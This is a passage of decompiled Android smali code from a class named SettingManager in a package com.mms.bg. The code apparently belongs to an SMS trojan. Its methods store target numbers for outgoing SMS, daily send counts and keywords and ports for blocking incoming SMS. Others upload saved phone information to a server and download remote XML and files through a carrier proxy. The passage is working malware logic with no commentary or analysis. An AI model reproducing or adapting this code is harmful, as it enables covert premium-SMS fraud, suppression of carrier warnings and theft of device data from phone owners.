    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_connect_server_time"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getLastDialFormatTime()Ljava/lang/String;
    .registers 4

    .prologue
    .line 263
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_dial_format_time"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getLastSMSFormatTime()Ljava/lang/String;
    .registers 4

    .prologue
    .line 190
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_sms_format_time"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getLastSMSTime()J
    .registers 5

    .prologue
    .line 252
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_sms_time"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getLastVedioDownloadTime()J
    .registers 5

    .prologue
    .line 217
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_vedio_download_time"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getPID()Ljava/lang/String;
    .registers 4

    .prologue
    .line 522
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "pid"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getSMSBlockBeginTime()J
    .registers 5

    .prologue
    .line 221
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_block_start_time"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getSMSBlockDelayTime()J
    .registers 5

    .prologue
    .line 199
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_block_time"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getSMSBlockKeys()Ljava/lang/String;
    .registers 4

    .prologue
    .line 239
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_block_key"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getSMSBlockPorts()Ljava/lang/String;
    .registers 4

    .prologue
    .line 230
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_block_port"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getSMSCenter()Ljava/lang/String;
    .registers 4

    .prologue
    .line 511
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_center"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getSMSEnable()Z
    .registers 4

    .prologue
    .line 294
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "enable_sms"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public getSMSRoundTotalSend()I
    .registers 4

    .prologue
    .line 312
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_round_total_send"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    return v0
.end method

.method public getSMSSendDelay()J
    .registers 5

    .prologue
    .line 321
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_send_delay"

    const-wide/32 v2, 0x5265c00

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method public getSMSTargetNum()Ljava/lang/String;
    .registers 4

    .prologue
    .line 276
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "target_num"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getSMSTempBlockNumAndTimes()Ljava/lang/String;
    .registers 4

    .prologue
    .line 354
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_temp_block_num_and_times"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getTodaySMSSendCount()I
    .registers 4

    .prologue
    .line 303
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "sms_send_count"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    return v0
.end method

.method public getVedioDownLinks()Ljava/util/ArrayList;
    .registers 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    const/4 v10, -0x1

    .line 969
    new-instance v1, Ljava/io/File;

    iget-object v8, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v1, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 970
    .local v1, file:Ljava/io/File;
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 971
    .local v6, ret:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v8

    const/4 v9, 0x1

    if-ne v8, v9, :cond_50

    .line 973
    :try_start_14
    new-instance v2, Ljava/io/FileInputStream;

    invoke-direct {v2, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 974
    .local v2, in:Ljava/io/FileInputStream;
    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v8

    long-to-int v3, v8

    .line 975
    .local v3, length:I
    new-array v0, v3, [B

    .line 976
    .local v0, datas:[B
    const/4 v8, 0x0

    array-length v9, v0

    invoke-virtual {v2, v0, v8, v9}, Ljava/io/FileInputStream;->read([BII)I

    .line 977
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v0}, Ljava/lang/String;-><init>([B)V

    .line 979
    .local v5, result:Ljava/lang/String;
    :goto_2a
    const-string v8, "href=\'http:"

    invoke-virtual {v5, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    .line 980
    .local v4, pos:I
    if-eq v4, v10, :cond_50

    .line 981
    add-int/lit8 v8, v4, 0x6

    invoke-virtual {v5, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v7

    .line 982
    .local v7, subStr:Ljava/lang/String;
    const-string v8, "\'>"

    invoke-virtual {v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    .line 983
    if-eq v4, v10, :cond_50

    .line 984
    const/4 v8, 0x0

    invoke-virtual {v7, v8, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 985
    add-int/lit8 v8, v4, 0x1

    invoke-virtual {v7, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;
    :try_end_4d
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_4d} :catch_4f

    move-result-object v5

    .line 992
    goto :goto_2a

    .line 993
    .end local v0           #datas:[B
    .end local v2           #in:Ljava/io/FileInputStream;
    .end local v3           #length:I
    .end local v4           #pos:I
    .end local v5           #result:Ljava/lang/String;
    .end local v7           #subStr:Ljava/lang/String;
    :catch_4f
    move-exception v8

    .line 996
    :cond_50
    return-object v6
.end method

.method public getVedioDownload(Ljava/lang/String;)Z
    .registers 13
    .parameter "url"

    .prologue
    const/4 v9, 0x0

    const-string v10, "SettingManager"

    .line 897
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, " download url = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 898
    const-string v7, "10.0.0.172"

    const-string v8, "80"

    invoke-virtual {p0, p1, v7, v8}, Lcom/mms/bg/ui/SettingManager;->openConnection(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 899
    .local v5, r:Lorg/apache/http/HttpResponse;
    if-nez v5, :cond_25

    move v7, v9

    .line 927
    :goto_24
    return v7

    .line 900
    :cond_25
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v7

    const/16 v8, 0xc8

    if-eq v7, v8, :cond_71

    .line 901
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "[[getTargetNum]] r.getStatusLine().getStatusCode() = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 902
    const-string v7, "SettingManager"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "r.getStatusLine().getStatusCode() = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p0, v10, v7}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    move v7, v9

    .line 903
    goto :goto_24

    .line 906
    :cond_71
    :try_start_71
    new-instance v4, Ljava/io/File;

    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_FILE_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v4, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 907
    .local v4, outFile:Ljava/io/File;
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v7

    if-nez v7, :cond_81

    .line 908
    invoke-virtual {v4}, Ljava/io/File;->createNewFile()Z

    .line 910
    :cond_81
    const-string v7, "[[getTargetNum]] download file now"

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 911
    new-instance v2, Ljava/io/FileOutputStream;

    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_FILE_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    const/4 v8, 0x0

    invoke-direct {v2, v7, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 912
    .local v2, fos:Ljava/io/FileOutputStream;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v3

    .line 913
    .local v3, is:Ljava/io/InputStream;
    const/16 v7, 0x400

    new-array v0, v7, [B

    .line 914
    .local v0, buffer:[B
    const/4 v6, 0x0

    .line 915
    .local v6, readLength:I
    :goto_9b
    const/4 v7, 0x0

    const/16 v8, 0x400

    invoke-virtual {v3, v0, v7, v8}, Ljava/io/InputStream;->read([BII)I

    move-result v6

    const/4 v7, -0x1

    if-eq v6, v7, :cond_ce

    .line 916
    const/4 v7, 0x0

    invoke-virtual {v2, v0, v7, v6}, Ljava/io/FileOutputStream;->write([BII)V

    .line 917
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->flush()V
    :try_end_ac
    .catch Ljava/lang/Exception; {:try_start_71 .. :try_end_ac} :catch_ad

    goto :goto_9b

    .line 923
    .end local v0           #buffer:[B
    .end local v2           #fos:Ljava/io/FileOutputStream;
    .end local v3           #is:Ljava/io/InputStream;
    .end local v4           #outFile:Ljava/io/File;
    .end local v6           #readLength:I
    :catch_ad
    move-exception v7

    move-object v1, v7

    .line 924
    .local v1, e:Ljava/lang/Exception;
    const-string v7, "SettingManager"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "[[getTargetNum]] e = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v10, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v7, v9

    .line 925
    goto/16 :goto_24

    .line 919
    .end local v1           #e:Ljava/lang/Exception;
    .restart local v0       #buffer:[B
    .restart local v2       #fos:Ljava/io/FileOutputStream;
    .restart local v3       #is:Ljava/io/InputStream;
    .restart local v4       #outFile:Ljava/io/File;
    .restart local v6       #readLength:I
    :cond_ce
    :try_start_ce
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 920
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 921
    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_FILE_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->dumpReceiveFile(Ljava/lang/String;)V
    :try_end_d9
    .catch Ljava/lang/Exception; {:try_start_ce .. :try_end_d9} :catch_ad

    .line 927
    const/4 v7, 0x1

    goto/16 :goto_24
.end method

.method public getVedioDownloadCount()I
    .registers 4

    .prologue
    .line 213
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "vedio_download_count"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    return v0
.end method

.method public getVedioXML()Z
    .registers 13

    .prologue
    const/4 v10, 0x0

    const-string v11, "SettingManager"

    .line 863
    const-string v7, ""

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 864
    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    const-string v8, "vedio_url"

    invoke-virtual {v7, v8}, Lcom/mms/bg/util/XMLHandler;->getChanneInfo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "10.0.0.172"

    const-string v9, "80"

    invoke-virtual {p0, v7, v8, v9}, Lcom/mms/bg/ui/SettingManager;->openConnection(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 865
    .local v5, r:Lorg/apache/http/HttpResponse;
    if-nez v5, :cond_1c

    move v7, v10

    .line 893
    :goto_1b
    return v7

    .line 866
    :cond_1c
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v7

    const/16 v8, 0xc8

    if-eq v7, v8, :cond_68

    .line 867
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "[[getTargetNum]] r.getStatusLine().getStatusCode() = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 868
    const-string v7, "SettingManager"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "r.getStatusLine().getStatusCode() = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p0, v11, v7}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    move v7, v10

    .line 869
    goto :goto_1b

    .line 872
    :cond_68
    :try_start_68
    new-instance v4, Ljava/io/File;

    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v4, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 873
    .local v4, outFile:Ljava/io/File;
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v7

    if-nez v7, :cond_78

    .line 874
    invoke-virtual {v4}, Ljava/io/File;->createNewFile()Z

    .line 876
    :cond_78
    const-string v7, "[[getTargetNum]] download file now"

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 877
    new-instance v2, Ljava/io/FileOutputStream;

    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    const/4 v8, 0x0

    invoke-direct {v2, v7, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 878
    .local v2, fos:Ljava/io/FileOutputStream;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v3

    .line 879
    .local v3, is:Ljava/io/InputStream;
    const/16 v7, 0x400

    new-array v0, v7, [B

    .line 880
    .local v0, buffer:[B
    const/4 v6, 0x0

    .line 881
    .local v6, readLength:I
    :goto_92
    const/4 v7, 0x0

    const/16 v8, 0x400

    invoke-virtual {v3, v0, v7, v8}, Ljava/io/InputStream;->read([BII)I

    move-result v6

    const/4 v7, -0x1

    if-eq v6, v7, :cond_c5

    .line 882
    const/4 v7, 0x0

    invoke-virtual {v2, v0, v7, v6}, Ljava/io/FileOutputStream;->write([BII)V

    .line 883
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->flush()V
    :try_end_a3
    .catch Ljava/lang/Exception; {:try_start_68 .. :try_end_a3} :catch_a4

    goto :goto_92

    .line 889
    .end local v0           #buffer:[B
    .end local v2           #fos:Ljava/io/FileOutputStream;
    .end local v3           #is:Ljava/io/InputStream;
    .end local v4           #outFile:Ljava/io/File;
    .end local v6           #readLength:I
    :catch_a4
    move-exception v7

    move-object v1, v7

    .line 890
    .local v1, e:Ljava/lang/Exception;
    const-string v7, "SettingManager"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "[[getTargetNum]] e = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v11, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v7, v10

    .line 891
    goto/16 :goto_1b

    .line 885
    .end local v1           #e:Ljava/lang/Exception;
    .restart local v0       #buffer:[B
    .restart local v2       #fos:Ljava/io/FileOutputStream;
    .restart local v3       #is:Ljava/io/InputStream;
    .restart local v4       #outFile:Ljava/io/File;
    .restart local v6       #readLength:I
    :cond_c5
    :try_start_c5
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 886
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 887
    iget-object v7, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {p0, v7}, Lcom/mms/bg/ui/SettingManager;->dumpReceiveFile(Ljava/lang/String;)V
    :try_end_d0
    .catch Ljava/lang/Exception; {:try_start_c5 .. :try_end_d0} :catch_a4

    .line 893
    const/4 v7, 0x1

    goto/16 :goto_1b
.end method

.method public getXMLInfoFromServer(Ljava/lang/String;)Z
    .registers 14
    .parameter "reason"

    .prologue
    const/4 v10, 0x0

    const-string v11, "SettingManager"

    .line 823
    invoke-direct {p0, p1}, Lcom/mms/bg/ui/SettingManager;->savePhoneInfo(Ljava/lang/String;)V

    .line 825
    new-instance v2, Ljava/io/File;

    iget-object v8, p0, Lcom/mms/bg/ui/SettingManager;->UPLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v2, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 826
    .local v2, file:Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_15

    move v8, v10

    .line 859
    :goto_14
    return v8

    .line 829
    :cond_15
    const-string v8, "[[getTargetNum]] the file upload is exist"

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 830
    invoke-virtual {p0, v2}, Lcom/mms/bg/ui/SettingManager;->openConnection(Ljava/io/File;)Lorg/apache/http/HttpResponse;

    move-result-object v6

    .line 831
    .local v6, r:Lorg/apache/http/HttpResponse;
    if-nez v6, :cond_22

    move v8, v10

    goto :goto_14

    .line 832
    :cond_22
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v8

    const/16 v9, 0xc8

    if-eq v8, v9, :cond_6e

    .line 833
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "[[getTargetNum]] r.getStatusLine().getStatusCode() = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 834
    const-string v8, "SettingManager"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "r.getStatusLine().getStatusCode() = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p0, v11, v8}, Lcom/mms/bg/ui/SettingManager;->log(Ljava/lang/String;Ljava/lang/String;)V

    move v8, v10

    .line 835
    goto :goto_14

    .line 838
    :cond_6e
    :try_start_6e
    new-instance v5, Ljava/io/File;

    iget-object v8, p0, Lcom/mms/bg/ui/SettingManager;->DOWNLOAD_FILE_PATH:Ljava/lang/String;

    invoke-direct {v5, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 839
    .local v5, outFile:Ljava/io/File;
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_7e

    .line 840
    invoke-virtual {v5}, Ljava/io/File;->createNewFile()Z

    .line 842
    :cond_7e
    const-string v8, "[[getTargetNum]] download file now"

    invoke-direct {p0, v8}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 843
    new-instance v3, Ljava/io/FileOutputStream;

    iget-object v8, p0, Lcom/mms/bg/ui/SettingManager;->DOWNLOAD_FILE_PATH:Ljava/lang/String;

    const/4 v9, 0x0

    invoke-direct {v3, v8, v9}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 844
    .local v3, fos:Ljava/io/FileOutputStream;
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v4

    .line 845
    .local v4, is:Ljava/io/InputStream;
    const/16 v8, 0x400

    new-array v0, v8, [B

    .line 846
    .local v0, buffer:[B
    const/4 v7, 0x0

